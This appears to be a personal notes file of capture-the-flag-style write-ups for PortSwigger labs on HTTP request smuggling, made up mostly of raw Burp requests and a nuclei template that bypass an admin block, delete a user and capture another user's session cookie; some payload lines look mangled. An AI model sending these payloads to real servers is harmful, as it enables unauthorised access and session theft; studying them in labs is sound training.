***Http request smuggling, basic CL.TE vulnerability***
Http smuggling CL/TE
Content-Length
Transfer-Encoding
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d14f5da1-9aba-408c-b9ae-4fe03952f0f3)

**HTTP request smuggling, basic TE.CL vulnerability**


Using nuclei

Yaml

```
id: TE-CL-http-smuggling
info:
  name: HTTP request smuggling, basic TE.CL vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      x=1
      0
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```
**HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**


Burpesuite request
Will respond with a 404 if successful 
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked
0
GET /404 HTTP/1.1
X-Ignore: X
```


**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**


Burp Request
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
```

**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**


Admin panel block
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a6a57ba3-6804-466c-ae3d-20156a906f01)




Trying CLTE to acccess blocked 
 
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/03085687-89d5-467f-9e03-36dff9b1f6e5)




Exploit:
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

We now have access to admin
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/de26bfa4-72f3-49cd-8ec6-aecb7828e8f5)


To delete user
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3197cc4d-a501-48e0-a562-428315de63d4)



**Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**

Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability:
This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
SOLUTION:
In the lab description, it is clearly stated that the front end supports transfer encoding: chunked but the backend server doesn’t. So access the lab and send the request to the burp repeater.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2537aa5c-c9f8-465d-8ac3-d3f9af0f3534)

Change the request method to POST and remove the unnecessary headers.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/83b49fc0-1404-4a5a-b4d9-c8e809c2496a)

Now we need to add our transfer encoding header. And also don't forget to add the trailing new lines.
We can see we are getting 200 ok response, Now we just need to figure out a way to request /admin which we can not access from the front end because of the security controls.
“Make sure update content length is disabled in repeater”
The next step is to create a Get request to /admin in our POST request’s body.
60 ==> SIZE OF OUR CHUNKED DATA
```
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/56737378-961b-4872-b548-db2155973728)

We can see the admin panel is only available to the local host. To bypass this situation we need to add another host header which has a value of
Payload:
71
```
POST /admin HTTP/1.1
HOST: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/add05481-9ea8-4ac4-b877-5557f7abe6ae)

Now we just need to delete the Carlos user.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7057fb1f-958d-4ad8-afec-aee02fe5f81b)

87 
```
GET /admin/delete?username=carlos HTTP/1.1 
Host: localhost 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 15  x=1 
0
```
This payload will delete the Carlos user.
Now let's see how we can chain this vulnerability to induce XSS in the victim's browser.

From <https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603> 

**Exploiting HTTP request smuggling to reveal front-end request rewriting**
front-end and back-end server, and the front-end server doesn't support chunked encoding.

From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting> 

Intercept request and change to post
Our response should have search result for follow by the rewritten http request

```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

Make note of  `x-nDBWAo` header 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a09771a0-9fb8-4147-ba3a-f0e53e69f265)





Our exploit to get admin
```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-nDBWAo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```


We can now delete the user
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c7f5346a-3229-42db-89aa-1ac2cf9131fa)




```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 170
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-nDBWAo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

**Exploiting HTTP request smuggling to capture other users' requests**

Intercept a comment submit and modify to the following
Increase second Content-Length to meet your need to show session cookie
```
POST / HTTP/1.1
Host: 0acf00500437c75381604dde003600ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 930
Cookie: session=ckjHb97MUxlfsPWlVtKf7m5RBEKuEort

csrf=vztP4gl8AAblrNS6an7vHFX3eZP4lori&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

Send on burpe
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/428cb6ec-50ac-4c15-a606-1670ccee94ad)

Go back and you should see your session cookie in the comments
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/19334f1f-41d8-435f-a3fd-6fd0cfdc69f7)

Copy the session cookie and csrf token and intercept a login request
Modify to your copied session cookie and csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7a8fa68d-d930-4fdd-b8e8-3617180e795e)

Forward request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a0542cf1-3152-4445-b225-b23588691592)

